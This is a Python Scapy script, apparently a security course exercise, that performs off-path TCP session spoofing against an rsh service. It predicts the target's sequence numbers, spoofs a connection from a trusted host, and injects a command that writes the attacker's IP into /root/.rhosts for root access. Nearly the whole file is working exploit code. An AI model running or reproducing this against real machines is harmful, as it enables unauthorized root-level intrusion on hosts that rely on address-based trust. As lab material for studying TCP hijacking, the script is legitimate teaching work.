from scapy.all import *

import sys

if __name__ == "__main__":
    conf.iface = sys.argv[1]
    target_ip = sys.argv[2]
    trusted_host_ip = sys.argv[3]

    my_ip = get_if_addr(sys.argv[1])

    #TODO: figure out SYN sequence number pattern
    ip = IP(dst = target_ip , src = my_ip)
    SYN = TCP(sport = 2048, dport = 514, flags = 'S')
    SYNACK = sr1(ip/SYN)
    #SYNACK.show()
    sequence1 = SYNACK.seq
    Reset = TCP(sport = 2048, dport = 514, flags = 'R')
    send( ip/ Reset)
    ## make connection second time
    SYN = TCP(sport = 4096, dport = 514, flags = 'S')
    SYNACK = sr1(ip/SYN)
    #SYNACK.show()
    sequence2 = SYNACK.seq
    Reset = TCP(sport = 4096, dport = 514, flags = 'R')
    send( ip/ Reset)
    
    
    #TODO: TCP hijacking with predicted sequence number
    #The sequence number for BSD TCP/IP stacks increases by 128,000 every second and by 64,000 for every new TCP connection. Start the new connection and the sequence number will be the previous one plus 64000
    print ("Start the TCP Off-Path Session Spoofing and send the new SYN...")
    ip = IP(src = trusted_host_ip, dst = target_ip)
    NewSYN = TCP(sport = 514, dport = 514, flags = 'S', seq = 1000)
    send(ip/NewSYN)
    time.sleep(1)
    print ("Start sending back ACK...")

    next_seq = sequence2 + (sequence2 - sequence1)
    ACK = TCP(sport = 514, dport = 514, flags = 'A', ack = next_seq+1, seq = 1001)
    send(ip/ACK)
   
    print ("Start sending payload...")
    null = "\x00"
    Attack = TCP(sport = 514, dport = 514, flags = 'AP', seq = 1001, ack = next_seq+1)/Raw(load=null)
    send(ip/Attack)
    #time.sleep(2)
    data = "root\0root\0echo " + "'" + my_ip + " root'" + " >> /root/.rhosts\0"
    print(data)
    Attack = TCP(sport = 514, dport = 514, flags = 'AP', seq = 1002, ack = next_seq+1)/Raw(load=data)
    send(ip/Attack)
    time.sleep(3)
    Reset = TCP(sport = 514, dport = 514, flags = 'R', ack = next_seq+1)
    send(ip/Reset)

    
